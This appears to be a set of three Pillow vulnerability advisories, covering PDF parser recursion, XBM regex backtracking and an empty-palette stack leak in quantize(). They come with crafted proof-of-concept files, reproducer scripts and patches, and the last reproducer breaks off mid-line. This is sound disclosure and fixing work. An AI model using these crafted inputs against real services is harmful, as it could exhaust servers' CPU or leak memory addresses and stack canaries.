summary: Pillow: PdfParser can recurse without limit in get_value() and linearize_page_tree()
description:
### Summary
`PdfParser`'s `get_value()` can recurse without any limit and crash with an uncaught `RecursionError`. It is reachable through `Image.save(im, fp=<pdf>, format="PDF", append=True)` when the existing PDF file is attacker-controlled. This is the same class of bug as https://github.com/advisories/GHSA-r73j-pqj5-w3x7 (the /Prev trailer chain loop, fixed earlier this year), in the same file, but in two different functions that fix did not touch.

### Details
**`get_value()` in `src/PIL/PdfParser.py`**

This is a classmethod that takes `max_nesting: int = -1` and has a guard:

```python
if max_nesting == 0:
    return None, None
```

Every recursive call (nested arrays, dictionaries, indirect object definitions) passes `max_nesting=max_nesting - 1`. Since the default and every call site start at -1, this only ever counts down further negative: -1, -2, -3, and so on. It never equals exactly 0, so the guard never runs. A PDF object with a value nested a few thousand levels deep is enough to hit Python's recursion limit. It does not even need a valid `/Pages` tree, since `read_pdf_info()` parses the `/Root` object's own dictionary first, before checking anything else.

This advisory reports a single vulnerability: an ineffective recursion-depth guard in `PdfParser.get_value()` (the sentinel  `-1`  default never reaches the `== 0` check). The mention of GHSA-r73j-pqj5-w3x7 is comparative context for an already-fixed, already-CVE'd bug in a different function — it is not a second vulnerability being reported. The three trigger paths (nested arrays/dicts/indirect objects) are not independently fixable; they share one root cause and one fix location in  get_value() .

### Steps to reproduce
Both PDFs below are plain text, built directly in Python, no PDF library needed.

```python
from PIL.PdfParser import PdfParser

def build_pdf(root):
    out = bytearray(b"%PDF-1.4\n")
    offset = len(out)
    out += f"1 0 obj\n".encode()
    out += root
    out += b"\nendobj\n"
    out += b"xref\n"
    out += f"0 2\n".encode()
    out += b"0000000000 65535 f \n"
    out += f"{offset:010d} 00000 ".encode() + b"n \n"
    xref_offset = len(out)
    out += b"xref\n"
    out += f"0 2\n".encode()
    out += b"0000000000 65535 f \n"
    out += f"{offset:010d} 00000 ".encode() + b"n \n"
    out += b"trailer\n"
    out += f"<< /Size 2 /Root 1 0 R >>\n".encode()
    out += b"startxref\n"
    out += f"{xref_offset}\n".encode()
    out += b"%%EOF"
    return bytes(out)

bomb = b"[" * 3000 + b"]" * 3000
root = b"<< /Type /Catalog /Pages 2 0 R /Bomb " + bomb + b" >>"
with open("nesting_bomb.pdf", "wb") as f:
    f.write(build_pdf(root))

PdfParser("nesting_bomb.pdf")     # raises RecursionError
```

Expected: a clean `PdfFormatError`.

Actual: raises a raw `RecursionError: maximum recursion depth exceeded`.

### Impact
- Availability: an attacker who controls the content of a PDF file that an application later appends an image page to (`Image.save(..., format="PDF", append=True)`) can crash that request with a RecursionError, using a file of a few hundred bytes.
- Confidentiality: none.
- Integrity: none.
- Pillow cannot open PDFs for reading through `Image.open()`. `PdfParser` is only reached through the append-mode save path, so the app has to be doing that specific thing (for example, stamping or watermarking an existing PDF) for this to matter.

summary: Pillow: ReDoS in XbmImagePlugin: 512-byte file stalls Image.open() for minutes
description:
``` ============================================================================ ReDoS in XbmImagePlugin: 512-byte file stalls Image.open() for minutes Location: src/PIL/XbmImagePlugin.py:58 in XbmImageFile._open() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 512-byte file makes Pillow's `Image.open()` spend about six minutes of processor time on one core before it gives up with `UnidentifiedImageError`. Anyone who can hand bytes to an application that opens images with Pillow's default settings can trigger this, for example through an upload form, a thumbnailer, or a service that checks whether a blob is an image. A few such files sent at once can tie up a typical pool of worker processes. The cause is the `xbm_head` regular expression in `src/PIL/XbmImagePlugin.py:32-40`, which `XbmImageFile._open()` (line 58) runs over the first 512 bytes of any stream whose prefix starts with `#define`. Several adjacent parts of the pattern can match the same characters. `[ \t]+` overlaps with `.*` in the width and height lines and with `[^_]*` in the optional hotspot lines, and `[\r\n]+` closing the hotspot group overlaps with the following `[\000-\377]*`. The header sets a run of k spaces after each `#define` and a run of k line terminators after `_y_hot`, then omits the `[]` after `_bits`. That forces Python's backtracking matcher to try every way of splitting those runs and rescan the remaining bytes each time. The cost grows roughly as k to the fifth power: k = 60 measured 375 s, while a well-formed XBM of the same size opens in about 40 ms. Because this happens before any format is identified, none of Pillow's size, pixel-count or decompression-bomb limits apply, and upload size limits do not help because the file is tiny. `ImageFile.Parser.feed()` repeats the cost on every chunk until the stream is identified. The only existing mitigation is passing a `formats=` allowlist that excludes `"XBM"`. The attached reproducer opens the same header with and without the trailing `[]`. The valid version opens as XBM in 52 ms. The broken version takes 0.1 s, 0.75 s, 3.0 s and 8.6 s at k = 10, 15, 20 and 25, and the slow k = 60 case is not run. This is the same class of bug as CVE-2021-25292 in `PdfParser`, but in a different plugin and reachable from plain `Image.open()`. ## Details `XbmImageFile._open()` identifies an XBM file by running the module-level regex `xbm_head` over the first 512 bytes of the stream. The pattern has several adjacent quantifier pairs that can consume the same characters, followed by a `[\000-\377]*_bits\[]` tail that rescans the rest of the buffer for every way of splitting them. A 512-byte input built to exercise all of them and then fail the final literal keeps `Image.open()` in `xbm_head.match()` for minutes before it raises `UnidentifiedImageError`. This 512-byte input (k = 60) takes 375 s of CPU in `Image.open(io.BytesIO(data))` with default settings, measured on the stock build at this commit: ```python k = 60 data = b"#define" + b" "*k + b"_width 1\r" data += b"#define" + b" "*k + b"_height 1\r" data += b"#define" + b" "*k + b"_x_hot 1\r" data += b"#define" + b" "*k + b"_y_hot 1" + b"\r"*k data += b"_bits" # no "[]": the final literal never matches data += b"A" * (512 - len(data)) # pad to the 512 bytes _open() reads ``` Calling `XbmImagePlugin.xbm_head.match(data)` directly gives the same picture: k = 10 → 0.11 s, k = 15 → 0.76 s, k = 20 → 3.0 s, k = 25 → 8.5 s, k = 30 → 19.9 s (roughly ×27 per doubling of k, i.e. about k^4.7). A well-formed 512-byte XBM matches in 10 µs and opens and loads through `Image.open()` in ~40 ms including plugin import; the same k = 60 header with `_bits[]` present matches in 5 µs. The regex, `src/PIL/XbmImagePlugin.py:32`: ```python xbm_head = re.compile( rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` and the only call site, `src/PIL/XbmImagePlugin.py:58`: ```python def _open(self) -> None: … m = xbm_head.match(self.fp.read(512)) if not m: msg = "not a XBM file" raise SyntaxError(msg) ``` For a well-formed header (`#define im_width 8\n…static char im_bits[] = {`) each `[ \t]+` eats the single space, `.*`/`[^_]*` eat the identifier prefix, and `[\000-\377]*_bits\[]` finds the literal on its first backward scan, so the match is linear. The crafted header diverges at every one of those points: - `[ \t]+.*_width` and `[ \t]+.*_height`: the run of k spaces after `#define` can be split between `[ \t]+` and `.*` in k ways, all leading to the same continuation. Factor k each. (The choice of `\r` terminators is incidental: the same header with `\n` terminators is equally slow.) - `[ \t]+[^_]*_x_hot` and `[ \t]+[^_]*_y_hot` inside the optional `hotspot` group: `[^_]*` also matches spaces, so the same k-way split exists twice more. Factor k each. These two lines are essential: without them the same input is rejected in about 10 ms. - `[\r\n]+` closing the `hotspot` group, followed by `)?` and `[\000-\377]*`: the run of k `\r` bytes after `_y_hot 1` can be divided between `[\r\n]+` and `[\000-\377]*` in k ways. Factor k. - `[\000-\377]*_bits\[]`: for every combination above, the engine swallows the remaining ~150 bytes of padding and walks back looking for `_bits[]`. The input contains `_bits` but never `[]`, so this always fails and every combination is visited. CPython's `re` is a backtracking engine without memoisation, so the total work is on the order of k^5 × (512 − header length) steps — about 10^11 for k = 60, consistent with the measured 375 s. The 512-byte read caps k (5k + ~60 ≤ 512), so the cost per `open()` is bounded, but the bound is minutes of CPU. The path is the default one. `Image.open()` (`src/PIL/Image.py:3719`) reads a 16-byte prefix and offers it to every registered plugin's accept hook; `XbmImagePlugin._accept()` (`src/PIL/XbmImagePlugin.py:43`) returns true for anything whose left-stripped prefix starts with `#define`, and `_open()` then runs the regex. No size, pixel-count or decompression-bomb check can apply before this point because nothing has been parsed yet, and since the match ultimately fails the file is never identified, so the only outcome for the caller is `UnidentifiedImageError` after the delay. File name and extension are irrelevant because dispatch is by content. A `faulthandler` stack dump taken 20 s into the call shows the interpreter at `XbmImagePlugin.py:58 in _open` ← `ImageFile.py:154 in __init__` ← `Image.py:3699 in _open_core` ← `Image.py:3719 in open`. `ImageFile.Parser.feed()` (`src/PIL/ImageFile.py:584`) amplifies this further: until the stream is identified it calls `Image.open()` on all accumulated data at every `feed()`, so an application feeding the stream in chunks pays the regex cost once per chunk (measured: k = 15 header fed in 8 chunks → 4.6 s versus 0.76 s for a single `open()`). ## Impact Anyone who can get 512 bytes in front of `Image.open()` — an upload endpoint, thumbnailer, or any service that uses Pillow to sniff whether a blob is an image — pins one CPU core of the handling process for roughly six minutes per request with the default plugin set and default limits. Nothing large is allocated and no `DecompressionBombWarning`/`Error` fires; application-side upload size limits do not help because the file is tiny, and `Image.MAX_IMAGE_PIXELS` is never consulted because no image is ever identified. A handful of concurrent requests is enough to exhaust a typical worker pool. The per-call cost is bounded by the 512-byte header read, so this is a CPU-exhaustion denial of service of the handling process rather than an infinite loop. Applications that pass an explicit `formats=` allowlist to `Image.open()` that excludes `"XBM"` are not affected. This is the same bug class as CVE-2021-25292 (catastrophic backtracking in the `PdfParser` regexes, fixed in 8.1.1) and CVE-2021-23437 (`ImageColor.getrgb` ReDoS, fixed in 8.3.2), in a different plugin; unlike the PDF case it is reached from plain `Image.open()` on any byte stream. ## Reproducing `repro` is a single Python script. It uses the installed Pillow through the public `Image.open()` API and needs no rebuild. Each input is the 512-byte header from Details: four `#define` lines with k spaces after `#define`, lines ending in `\r`, k `\r` bytes after `_y_hot 1`, padding with `A` up to the 512 bytes that `_open()` reads. The only thing that changes between inputs is the tail: `_bits[]` (valid) or `_bits` (the final literal can never match). 1. **Control.** Opens the k = 60 header with the tail `_bits[]`. The regex matches on its first try and Pillow reports `XBM (1, 1)` in about 50 ms. This shows that the same bytes are only slow when the match has to fail. 2. **Attack.** Opens the header with the tail `_bits` at k = 10, 15, 20 and 25. Each one raises `UnidentifiedImageError`, after about 0.1 s, 0.75 s, 3.0 s and 8.6 s. The time grows polynomially, not linearly. The k = 60 input from Details, which takes about 6 minutes of CPU, is not run. Expected output on this commit: ``` control k=60 '_bits[]': XBM (1, 1) in 0.052s attack k=10 '_bits' : UnidentifiedImageError in 0.105s attack k=15 '_bits' : UnidentifiedImageError in 0.748s attack k=20 '_bits' : UnidentifiedImageError in 3.024s attack k=25 '_bits' : UnidentifiedImageError in 8.561s BUG ``` The script prints `BUG` only when all of these hold: - the control header opened as `XBM` in under 1 s; - the k = 25 attack input took more than 2 s; - the k = 25 attack input took more than 5 times as long as the k = 15 one, i.e. the cost grows super-linearly in k. Otherwise it prints `OK`. With the attached patch applied, every attack input is rejected at once, so the script prints `OK`. ## Suggested fix The attached patch removes the overlap between `[ \t]+` and the quantifier that matches the identifier prefix in `xbm_head` (`src/PIL/XbmImagePlugin.py:32-40`), so the whitespace after `#define` can be consumed in exactly one way and the identifier cannot run across line terminators. It matches the identifier with `[^ \t\r\n]*` (and `[^ \t\r\n_]*` in the hotspot group, which keeps the existing "no underscore before `_x_hot`/`_y_hot`" behaviour); the remaining quantifier pairs are then either over disjoint character classes or reduce to a single linear rescan of at most 512 bytes: ```diff xbm_head = re.compile( - rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" + rb"\s*#define[ \t]+[^ \t\r\n]*_width[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n]*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" - b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` This mirrors the `PdfParser` fix for CVE-2021-25292. The patch also adds a `test_redos` case to `Tests/test_file_xbm.py`, in the style of the one in `Tests/test_file_pdf.py`: it builds the k = 60 header from Details and, under `@timeout_unless_slower_valgrind(1)`, expects `XbmImageFile` to raise `SyntaxError`. With the patch applied to a clean checkout and rebuilt, the reproducer prints `OK` and the existing `Tests/test_file_xbm.py` (including `hopper.xbm`, `hopper_underscore.xbm` and the hotspot round-trip) still passes. The change does reject headers whose identifier contains whitespace (`#define foo bar_width 16`), which is not valid C and is not produced by Pillow's own XBM writer. ## The patch Use more specific regex chars in the XBM header regex to prevent ReDoS in Image.open() on a crafted 512-byte header Applies to `src/PIL/XbmImagePlugin.py` at the commit above. ```diff diff --git a/Tests/test_file_xbm.py b/Tests/test_file_xbm.py index 1988c417f..67236c795 100644 --- a/Tests/test_file_xbm.py +++ b/Tests/test_file_xbm.py @@ -6,7 +6,7 @@ import pytest from PIL import Image, XbmImagePlugin -from .helper import hopper +from .helper import hopper, timeout_unless_slower_valgrind TYPE_CHECKING = False if TYPE_CHECKING: @@ -91,3 +91,17 @@ def test_hotspot(tmp_path: Path) -> None: with Image.open(out) as reloaded: assert reloaded.info["hotspot"] == hotspot + + +@timeout_unless_slower_valgrind(1) +def test_redos() -> None: + k = 60 + malicious = b"#define" + b" " * k + b"_width 1\r" + malicious += b"#define" + b" " * k + b"_height 1\r" + malicious += b"#define" + b" " * k + b"_x_hot 1\r" + malicious += b"#define" + b" " * k + b"_y_hot 1" + b"\r" * k + b"_bits" + malicious += b"A" * (512 - len(malicious)) + + # The important thing is it doesn't timeout, cause a ReDoS + with pytest.raises(SyntaxError): + XbmImagePlugin.XbmImageFile(BytesIO(malicious)) diff --git a/src/PIL/XbmImagePlugin.py b/src/PIL/XbmImagePlugin.py index 95729d73d..7435d20f2 100644 --- a/src/PIL/XbmImagePlugin.py +++ b/src/PIL/XbmImagePlugin.py @@ -29,12 +29,14 @@ if TYPE_CHECKING: from typing import IO # XBM header +# The identifier before each suffix cannot contain whitespace, so that it +# cannot overlap with the preceding [ \t]+ and cause a ReDoS xbm_head = re.compile( - rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" + rb"\s*#define[ \t]+[^ \t\r\n]*_width[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n]*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" - b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` ## The reproducer
Reproducer — repro, 1,138 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # XbmImagePlugin.xbm_head catastrophic backtracking, reached from Image.open() # on a <=512-byte stream. Prints BUG if a failing 512-byte header takes # super-linearly long while the same-shaped valid header opens instantly. import io, time from PIL import Image def hdr(k, tail): d = b"" for name in (b"_width 1\r", b"_height 1\r", b"_x_hot 1\r", b"_y_hot 1"): d += b"#define" + b" " * k + name d += b"\r" * k + tail return d + b"A" * (512 - len(d)) def timed(data): s = time.perf_counter() try: im = Image.open(io.BytesIO(data)); r = f"{im.format} {im.size}" except Exception as e: r = type(e).__name__ return r, time.perf_counter() - s ctl, tc = timed(hdr(60, b"_bits[]")) print(f"control k=60 '_bits[]': {ctl} in {tc:.3f}s") ts = {} for k in (10, 15, 20, 25): r, ts[k] = timed(hdr(k, b"_bits")) print(f"attack k={k:2d} '_bits' : {r} in {ts[k]:.3f}s", flush=True) # k=60 (fits easily in 512 bytes) runs for minutes; not executed here. bug = ctl.startswith("XBM") and tc < 1 and ts[25] > 2 and ts[25] > 5 * ts[15] print("BUG" if bug else "OK") ```

summary: Pillow: Image.quantize() with empty palette leaks uninitialized stack memory
description:
``` ============================================================================ Image.quantize() with empty palette leaks uninitialized stack memory Location: src/libImaging/Palette.c:216 in ImagingPaletteCacheUpdate() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` When an application lets a user supply the palette image for Pillow's `Image.quantize(palette=...)`, the user can get back 512 bytes of the server process's stack memory in the pixels of the returned image. An 80-byte PNG with an empty palette is enough, and the leaked bytes survive saving to PNG or GIF. In the runs examined, those bytes included memory addresses inside the stack, heap, libc, libpython and Pillow's own C module, along with the stack-protector canary. The bug is in `ImagingPaletteCacheUpdate()` in `src/libImaging/Palette.c`. It fills a local `UINT8 c[512]` only inside loops bounded by `palette->size`. When the palette has zero entries, the array is never written, but it is still copied into the colour cache. `topalette()` in `src/libImaging/Convert.c` then emits the cached values as output pixel indices. `topalette()` rejects a `NULL` palette but not one with `size == 0`. Three inputs produce such a zero-entry `"P"` image: a PNG with a zero-length `PLTE` chunk opened with `Image.open()`, a colour-mapped TGA with colour-map length 0, or a bare `Image.new("P", ...)`. The attacker must control the *palette* image; the source image can be anything, and `RGB` sources are affected with either dither mode. There is no out-of-bounds access and no memory corruption. The consequence is a bounded stack disclosure that can reveal address layout and the canary of a long-lived worker, with no crash and no log entry. The attached reproducer quantizes a 512-colour strip against the empty-palette PNG and finds 8 of the 64 output words pointing into the process's own `[stack]` mapping, while a one-entry palette control yields all zeros. The behaviour was introduced in commit `54cb09d8b48c` (first released in 9.1.0). The `Image.new("P", ...)` route exists since 10.1.0. ## Details `ImagingPaletteCacheUpdate()` (`src/libImaging/Palette.c:154`) computes, for one 8×8×8 box of the colour cache, the nearest palette index for each of the 512 slots into a local `UINT8 c[512]` and then copies `c[]` into the cache. `c[]` is only ever written inside `for (i = 0; i < palette->size; i++)`. When the palette has zero entries nothing writes it, the untouched stack bytes are copied into the cache, and `topalette()` (`src/libImaging/Convert.c:1145`) emits them as the output pixels of `Image.quantize(palette=...)`. The root cause is that `topalette()` only rejects a `NULL` palette, never one with `palette->size == 0`, while `ImagingPaletteCacheUpdate()` silently assumes `size >= 1`. A zero-entry `"P"` image is what `Image.open()` produces for a PNG whose `PLTE` chunk has length 0 (or a colour-mapped TGA with colour-map length 0); `Image.new("P", size)` without a subsequent `putpalette()` yields one as well. Both dither modes (`Dither.NONE` and the default Floyd-Steinberg) are affected for `RGB` sources (an `L` source takes the grayscale copy path and never consults the cache). Showing it with the installed build, no special flags. The 80-byte PNG below is 4×4, bit depth 8, colour type 3, with a zero-length `PLTE` and an all-zero `IDAT`: ``` 89504e470d0a1a0a 0000000d49484452 0000000400000004 0803000000 9e2f6e4c 00000000 504c5445 4ba88955 0000000b 49444154 789c6360c0040000140001 7dfe1eee 00000000 49454e44 ae426082 ``` ```python pal = Image.open(io.BytesIO(png)); pal.load() # pal.mode == "P", pal.im.getpalette("RGB") == b"" src = Image.new("RGB", (512, 1)) src.putdata([(r*4, g*4, b*4) for r in range(8) for g in range(8) for b in range(8)]) out = src.quantize(palette=pal, dither=Image.Dither.NONE) out.tobytes() # 512 bytes, different in every process ``` The 512 source colours are chosen so that each pixel lands in a distinct slot of the cache box for `r,g,b ∈ [0,32)`, in slot order, so `out.tobytes()` is exactly `c[0..511]`. Read as 64 little-endian 8-byte words and resolved against the same process's `/proc/self/maps`, a typical run gives 43 words that are addresses inside the process's own mappings — 8 in `[stack]`, several in `[heap]`, `libc.so.6`, `libpython3.12.so` and `_imaging.cpython-312-x86_64-linux-gnu.so` — and 3 words equal to the thread's stack-protector canary (read from `fs:0x28` for comparison). The same PNG with a 3-byte `PLTE` (one entry) gives 512 zero bytes in every run. `out.save(buf, "PNG")` succeeds, so the bytes leave the process in an ordinary image. Under valgrind (run against a `strip --strip-debug` copy of `_imaging.so` or a gcc build, since valgrind 3.19 cannot read clang's DWARF5) the report carries the origin `Uninitialised value was created by a stack allocation at ImagingPaletteCacheUpdate`. With `Dither.NONE` `topalette` only copies the bytes, so the first `use of uninitialised value` is flagged where Python first branches on the pixel data; with the default Floyd-Steinberg dither it is flagged inside `topalette` (inlined into `ImagingConvert`), where the cached index is used to address `palette->palette`. ### Code path File → empty C palette. `PngImagePlugin.chunk_PLTE` (`src/PIL/PngImagePlugin.py:499-505`) stores the chunk payload whatever its length, `_open` wraps it as `ImagePalette.raw("RGB", b"")` (`:836-838`), and `Image.load()` realises it with `self.im.putpalette("RGB", "RGB", b"")` (`src/PIL/Image.py:989-990`). `_putpalette` (`src/_imaging.c:1850-1868`) rejects only more than 256 entries and sets `palette->size = palettesize * 8 / bits`, i.e. 0. `TgaImagePlugin._open` (`src/PIL/TgaImagePlugin.py:121-135`) builds the same empty palette from a colour-mapped TGA whose colour-map-length field is 0. API → sink. `Image.quantize(palette=pal)` (`src/PIL/Image.py:1329-1338`) checks only `palette.mode == "P"` and calls `self.im.convert("P", dither, palette.im)` → `ImagingConvert` → `topalette(..., inpalette=, dither)`. `topalette` tests the palette for `NULL` (`Convert.c:1162`, `:1178`) but not for `size == 0`, allocates the cache (every slot `0x100` = "not computed"), and for each source pixel: ```c // src/libImaging/Convert.c:1319-1327 (non-dither path; the dither path at 1252-1265 is the same) cache = &ImagingPaletteCache(palette, r, g, b); if (cache[0] == 0x100) { ImagingPaletteCacheUpdate(palette, r, g, b); } … out[x] = (UINT8)cache[0]; ``` Inside `ImagingPaletteCacheUpdate` the only store to `c[]` is in step 2, and both step 1 and step 2 iterate over palette entries: ```c // src/libImaging/Palette.c:160-161 unsigned int d[BOXVOLUME]; UINT8 c[BOXVOLUME]; … // src/libImaging/Palette.c:212-221, 240-242 for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; /* d[] is initialised, c[] is not */ } for (i = 0; i < palette->size; i++) { /* size == 0: body never runs */ if (dmin[i] <= dmax) { … if ((unsigned int)bd < d[j]) { d[j] = bd; c[j] = (UINT8)i; } ``` For any non-empty palette every slot is written: the entry that produced `dmax` passes `dmin[i] <= dmax`, and because `d[j]` starts at `~0` the first visiting entry always stores into `c[j]`. With `size == 0` the loop is skipped entirely and step 3 publishes the raw stack array: ```c // src/libImaging/Palette.c:262-266 j = 0; for (r = r0; r < r1; r += 4) { for (g = g0; g < g1; g += 4) { for (b = b0; b < b1; b += 4) { ImagingPaletteCache(palette, r, g, b) = c[j++]; ``` `cache[0]` is then ≤ 255 and `palette->palette` is a fixed 1024-byte array, so the subsequent `palette->palette[cache[0] * 4]` reads in the dither path stay in bounds; the defect is purely that stack contents become pixel values. Because no deeper call happens between successive `ImagingPaletteCacheUpdate` invocations in the pixel loop, every box yields the same 512 bytes — whatever earlier, deeper call chains (the PNG decode, the interpreter) left at that stack depth. The behaviour was introduced in `54cb09d8b48c` ("When converting to P, restrict colors to palette size", 2022-02-16), first released in 9.1.0; before it, the cache update iterated over all 256 palette slots. The `Image.new("P", ...)` route additionally depends on `fd310512b95a` ("Set C palette to be empty by default", first in 10.1.0); before that a fresh `"P"` image carried a 256-entry grey ramp. ## Impact An application that lets a user supply the reference palette image for `Image.quantize(palette=...)` — palette-swap / "apply this palette" features, sprite and GIF tooling, pixel-art converters — and returns the quantised result hands that user 512 bytes of the worker's C stack, encoded as pixel indices (directly readable from the saved PNG/GIF, since index values survive losslessly). In the build examined those bytes contain return addresses and frame pointers into the stack, heap, libc, libpython and `_imaging.so`, plus the stack-protector canary: an ASLR and canary disclosure from a long-lived server process, obtained with an 80-byte upload, no crash and no log entry. The precondition is that the attacker controls the *palette* image (the source image can be anything with at least one colour per cache box of interest); when the palette image is application-owned the path is not reachable. There is no out-of-bounds access and no memory corruption. ## Reproducing `repro` is a short, single-file Python script that runs against the installed Pillow. It doesn't rebuild anything or start any other process, and it finishes in about 0.1 s. 1. `png_with_plte()` builds a 4×4 palette-mode PNG (bit depth 8, colour type 3) around a given `PLTE` payload. With an empty payload it produces exactly the 80-byte file shown above. 2. `quantize_against()` does what an "apply this palette" feature does: it opens the PNG with `Image.open()` and calls `quantize(palette=pal, dither=Image.Dither.NONE)` on a 512×1 RGB strip. The strip holds the colours `(r*4, g*4, b*4)` for `r, g, b` in `0..7`, one for each slot of the colour-cache box `r, g, b ∈ [0,32)` and in slot order. That makes output pixel `j` exactly `c[j]` of `ImagingPaletteCacheUpdate()`. 3. **Control:** a one-entry `PLTE`. The only valid index is 0, and every output pixel is 0. 4. **Attack:** the same PNG with a zero-length `PLTE`. `quantize()` returns an image without complaint, and its pixels contain about 80 distinct values. 5. **Check:** the script reads the 512 output bytes as 64 little-endian 8-byte words and compares them with the `[stack]` range in the script's own `/proc/self/maps`. It prints each word that points into the stack. A typical run finds 8, e.g. `pixels 0..7 = 0x00007ffd959c3fa0 <- pointer into [stack]`. Pixel data can only hold stack addresses if it was copied from the stack. The script prints `BUG` if the control is all zeros and at least two output words are stack addresses. It prints `OK` if `quantize()` rejects the empty palette with `ValueError`, which is what the attached patch does, or if the output has no stack pointers. The script was also checked against an out-of-tree rebuild, which is not part of the script. With the attached patch it prints `attack (empty PLTE): rejected: empty palette` / `OK`. With only the `Palette.c` half of the patch, the output is 512 zero bytes and it prints `OK`. ## Suggested fix The attached patch rejects an empty palette in `topalette()` before any work is done, with `ValueError("empty palette")` in the same idiom as the neighbouring "no palette" / "conversion not supported" checks, so `Image.quantize()` raises a normal `ValueError`. It also zero-fills `c[]` alongside `d[]` in `ImagingPaletteCacheUpdate()` so no present or future caller can copy stack contents into the cache, and adds a regression test `test_empty_palette` to `Tests/test_image_quantize.py`. `quantize(palette=)` is the only path that hands a caller-supplied palette to `topalette()`; the `NULL`-palette branches always build 256- or 226-entry palettes and are unaffected. The one behaviour change is that quantizing against an empty palette (including a bare `Image.new("P", ...)`) now raises instead of returning garbage indices. The C changes: ```diff --- a/src/libImaging/Convert.c +++ b/src/libImaging/Convert.c @@ -1159,6 +1159,10 @@ topalette( alpha = mode == IMAGING_MODE_PA; + if (palette != NULL && palette->size <= 0) { + return (Imaging)ImagingError_ValueError("empty palette"); + } + if (palette == NULL) { /* FIXME: make user configurable */ if (imIn->bands == 1) { --- a/src/libImaging/Palette.c +++ b/src/libImaging/Palette.c @@ -211,6 +211,7 @@ ImagingPaletteCacheUpdate(ImagingPalette palette, int r, int g, int b) { for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; + c[i] = 0; } for (i = 0; i < palette->size; i++) { ``` Applied to a clean copy of the tree and rebuilt, the reproducer's attack step fails with `ValueError: empty palette` and the script prints `OK`; the one-entry control is unchanged. Apart from the regression test, the patch does not touch the Python code in `src/PIL`. Optionally `PngImagePlugin.chunk_PLTE` could additionally raise `SyntaxError` for a `PLTE` whose length is 0 or not a multiple of 3, as the PNG specification requires 1–256 entries, and `Image.quantize()` could raise a clearer Python-level error when `palette.palette` is empty. ## The patch Raise ValueError in topalette() for a palette with no entries and zero-initialise the cache slot array in ImagingPaletteCacheUpdate() Applies to `src/libImaging/Convert.c` at the commit above. ```diff diff --git a/Tests/test_image_quantize.py b/Tests/test_image_quantize.py index 887628560..dcd1d901e 100644 --- a/Tests/test_image_quantize.py +++ b/Tests/test_image_quantize.py @@ -179,3 +179,13 @@ def test_small_palette() -> None: quantized_colors = im.getcolors() assert quantized_colors is not None assert len(quantized_colors) == 2 + + +def test_empty_palette() -> None: + im = hopper() + + p = Image.new("P", (1, 1)) + p.putpalette(b"") + + with pytest.raises(ValueError): + im.quantize(palette=p) diff --git a/src/libImaging/Convert.c b/src/libImaging/Convert.c index 4a35a9a1f..7746d9255 100644 --- a/src/libImaging/Convert.c +++ b/src/libImaging/Convert.c @@ -1159,6 +1159,10 @@ topalette( alpha = mode == IMAGING_MODE_PA; + if (palette != NULL && palette->size <= 0) { + return (Imaging)ImagingError_ValueError("empty palette"); + } + if (palette == NULL) { /* FIXME: make user configurable */ if (imIn->bands == 1) { diff --git a/src/libImaging/Palette.c b/src/libImaging/Palette.c index b2dacf656..ceb69d3dc 100644 --- a/src/libImaging/Palette.c +++ b/src/libImaging/Palette.c @@ -211,6 +211,7 @@ ImagingPaletteCacheUpdate(ImagingPalette palette, int r, int g, int b) { for (i = 0; i < BOXVOLUME; i++) { d[i] = (unsigned int)~0; + c[i] = 0; } for (i = 0; i < palette->size; i++) { ``` ## The reproducer
Reproducer — repro, 2,975 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # Pillow: Image.quantize(palette=

